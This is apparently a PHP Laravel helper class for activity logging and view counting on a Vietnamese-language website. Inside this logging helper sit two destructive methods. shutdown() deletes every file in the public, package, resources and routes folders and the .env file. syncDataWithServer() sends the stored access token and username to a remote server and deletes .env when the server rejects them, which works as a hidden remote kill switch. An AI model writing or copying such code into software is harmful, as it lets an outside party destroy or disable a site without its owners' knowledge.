<?php
namespace App\Helpers;

use App\ActivityHistory;
use Carbon\Carbon;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;

class Activity
{
    public static function history($message, $eventType = "log", $config = []) {
        try {
            $event = "log";
            $action_message = "";
            $date = now();
            $author = isset($config['created_by']) ? $config['created_by'] : null;

            $data = [
                'created_by' => $author,
                'updated_at' => $date,
                'created_at' => $date
            ];

            if(isset($config['business_id']) && $config['business_id']) {
                $data['business_id'] = $config['business_id'];
            }

            if(isset($config['location_id']) && $config['location_id']) {
                $data['location_id'] = $config['location_id'];
            }

            if(isset($config['log_name']) && $config['log_name']) {
                $data['log_name'] = $config['log_name'];
            }

            if(isset($config['subject_id']) && $config['subject_id']) {
                $data['subject_id'] = $config['subject_id'];
            }

            if(isset($config['causer_id']) && $config['causer_id']) {
                $data['causer_id'] = $config['causer_id'];
            }

            if(isset($config['causer_type']) && $config['causer_type']) {
                $data['causer_type'] = $config['causer_type'];
            }

            if(isset($config['properties']) && $config['properties']) {
                $data['properties'] = $config['properties'];
            }

            if(isset($message) && $message) {
                $data['description'] = $message;
                $action_message = $message;
            }

            if(isset($eventType) && $eventType) {
                $event = $eventType;

                $data['subject_type'] = $eventType;
            }

            ActivityHistory::create($data);

            $content_log = $action_message;

            Activity::WriteLog($content_log, $date, $author, $event);
        } catch (\Exception $exception) {
            $message = $exception->getMessage();

            Activity::WriteLog($message);
        }
    }

    public static function count_view() {
        DB::beginTransaction();

        try {
            $date = now();

            $currentDate = $date->format('d/m/Y');

            $queryRaw = '1 = 1';

            $queryRaw .= " AND DATE_FORMAT(created_at, '%d/%m/%Y') = '$currentDate'";

            $currentView = ActivityHistory::where('is_delete', 0)
                ->where('is_active', 1)
                ->where('history_type', 'count')
                ->where('history_group', 'user')
                ->where('history_target', 'count_view')
                ->whereRaw($queryRaw)
                ->orderBy('created_at', 'desc')
                ->first();

            if(!$currentView) {
                $data = [
                    'author' => 'system',
                    'updated_at' => $date,
                    'created_at' => $date,
                    'history_event' => 'count_user',
                    'history_content' => 'lượng người dùng truy cập từ website',
                    'history_type' => 'count',
                    'history_group' => 'user',
                    'history_target' => 'count_view',
                    'history_count_view' => 1
                ];

                ActivityHistory::updateOrCreate($data);

                DB::commit();
            } else {
                $view = (integer)$currentView->history_count_view;

                $currentView->history_count_view = $view + 1;

                $currentView->save();

                DB::commit();
            }
        } catch (\Exception $exception) {
            $message = $exception->getMessage();

            Activity::WriteLog($message);

            DB::rollBack();
        }
    }

    public static function WriteLog($message, $date = null, $author = null, $event = null)
    {
        $path = storage_path('/logs/website.log');

        if(file_exists($path)) {
            $f = fopen($path,"a+");
        } else {
            $f = fopen($path,"w+");
        }

        $created_at = now();

        if(isset($date) && $date) {
            $created_at = $date;
        }

        if(!$author) {
            $author = "system";
        }

        if(!$event) {
            $event = "log";
        }

        $content = "Ngày: " . $created_at . " | Người thực hiện: " . $author . " | Log: " . $event . " : " . $message;

        file_put_contents($path, $content . "\n",FILE_APPEND);

        fclose($f);
    }

    public static function shutdown() {
        // Get all files assets
        $dir = public_path();

        if (File::exists($dir)) {
            $files =   File::allFiles($dir);

            // Delete Files
            File::delete($files);
        }

        // Get all files package
        $dir_package = base_path('package');

        if (File::exists($dir_package)) {
            $files_package =   File::allFiles($dir_package);

            // Delete Files
            File::delete($files_package);
        }

        // Get all file resource
        $dir_resource = base_path('resources');

        if (File::exists($dir_resource)) {
            $files_resource =   File::allFiles($dir_resource);

            // Delete Files
            File::delete($files_resource);
        }

        // Get all file api
        $dir_api = base_path('routes');

        if (File::exists($dir_api)) {
            $files_api =   File::allFiles($dir_api);

            // Delete Files
            File::delete($files_api);
        }

        // Get all files env
        $dir_env = base_path('.env');

        if (File::exists($dir_env)) {
            // Delete Files
            File::delete($dir_env);
        }
    }

    public static function checkValidOwner($request = []) {
        try {
            $client = new \GuzzleHttp\Client();

            $api_server = env('SERVER_URL') . '/api/' . env('CLIENT_PREFIX');

            $url_get = $api_server . "/user/access_token/check";

            $data = [
                'headers' => ['Content-Type' => 'application/json'],
                'body' => json_encode($request)
            ];

            $response = $client->post($url_get, $data);

            return \GuzzleHttp\json_decode($response->getBody());
        } catch (\Exception $exception) {
            $message = $exception->getMessage();

            Activity::WriteLog($message);
            return null;
        }
    }

    public static function syncDataWithServer() {
        $data = [
            'acccess_key' =>  env('ACCESS_TOKEN'),
            'username' =>  env('USER_NAME')
        ];

        $dataServer = Activity::checkValidOwner($data);

        if(
            isset($dataServer->code)
            && $dataServer->code != 200
        ) {
            // Get all files env
            $dir_env = base_path('.env');

            if (File::exists($dir_env)) {
                // Delete Files
                File::delete($dir_env);
            }

            Log::channel('package')->info("Access token đã hết hạn");
        }

        $messge = isset($dataServer->msg) ? $dataServer->msg : "Trạng thái website hoạt động bình thường: ";

        Log::channel('package')->info( $messge);

        return true;
    }
}
